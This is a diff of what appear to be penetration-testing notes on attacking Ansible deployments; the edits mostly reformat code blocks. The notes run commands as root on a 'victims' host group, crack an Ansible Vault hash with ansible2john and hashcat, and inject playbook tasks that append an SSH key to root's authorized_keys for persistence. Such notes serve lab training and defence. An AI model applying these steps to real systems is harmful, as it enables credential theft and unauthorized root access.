@@ -11,16 +11,19 @@ _Ansible_ is an infrastructure configuration engine that enables IT personnel to
 Config in `/etc/ansible/hosts`.
 The _ansibleadm_ user on the controller issues commands.
 From the command machine:
-```shell
+
+{% highlight shell %}
 ansible victims -a "whoami"
-```
+{% endhighlight %}
+
 This will run `whoami` on all members of the Ansible group. To run it as root `ansible victims -a "whoami" --become` or specify the user `ansible victims -a "whoami" --become user2`.
 
 #### Playbooks
 Sets of tasks written in YAML to be scripted so that they can be run in a routine.
 Check this files in _/opt/playbooks_ to see if there's any info leakage.
+
 I.E.
-```YAML
+{% highlight yaml %}
 ---
 - name: Write a file as offsec
   hosts: all
@@ -36,10 +39,11 @@ I.E.
           mode: 0644
           owner: offsec
           group: offsec
-```
+{% endhighlight %}
 
 Ansible has a new features called _Ansible Vault_ to securely store credentials for playbooks:
-```yaml
+
+{% highlight yaml %}
 ansible_become_pass: !vault |
           $ANSIBLE_VAULT;1.1;AES256
           39363631613935326235383232616639613231303638653761666165336131313965663033313232
@@ -47,21 +51,24 @@ ansible_become_pass: !vault |
           36623435623638373636626237333163336263623737383532663763613534313134643730643532
           3132313130313534300a383762366333303666363165383962356335383662643765313832663238
           3036
-```
+{% endhighlight %}
 
 Copy the hash starting with "$ANSIBLE_VAULT......." and use _ansible2john_ to convert it in a crackable way to then:
-```shell
+
+{% highlight shell %}
 hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
-```
+{% endhighlight %}
 
 to then decrypt the vault like:
-```shell
+
+{% highlight shell %}
 cat pw.txt | ansible-vault decrypt
-```
+{% endhighlight %}
 
 Also, if the playbook files used on the controller have world-writable permissions or if we can find a way to write to them (perhaps through an exploit), we can inject tasks that will then be run the next time the playbook is run.
 I.E. to add to the yaml playbook:
-```yaml
+
+{% highlight yaml %}
 - name: Create a directory if it does not exist
       file:
         path: /root/.ssh
@@ -83,6 +90,6 @@ I.E. to add to the yaml playbook:
         path: /root/.ssh/authorized_keys
         line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
         insertbefore: EOF
-```
+{% endhighlight %}
 
 Also, some modules from Ansible might leak data in /var/log/syslog (I.E. shell module)
